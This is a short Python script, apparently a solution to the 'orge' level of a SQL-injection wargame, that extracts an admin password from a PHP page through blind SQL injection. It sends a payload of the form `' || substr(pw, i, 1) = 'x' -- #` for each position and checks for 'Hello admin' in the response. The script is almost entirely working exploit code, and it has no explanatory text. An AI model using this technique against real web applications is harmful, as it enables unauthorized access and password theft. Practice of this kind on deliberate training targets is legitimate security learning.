import requests
import string

url = 'https://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php'

mycookie = {
    'PHPSESSID': ''
}

letters = string.digits + string.ascii_letters
ans = ""
"""
response = requests.get(url + "?pw=' || length(pw)=7 -- #", cookies=mycookie)
print(len(response.text))
"""
for i in range(1, 9):
    for char in letters:
        print(char)
        response = requests.get(url + "?pw=' || substr(pw, {index}, 1) = \'{char}\' -- #".format(index = i, char = char), cookies=mycookie)        
        # print(len(response.text))
        if 'Hello admin' in response.text:
            ans += char
            print(char)
            break
print(ans)
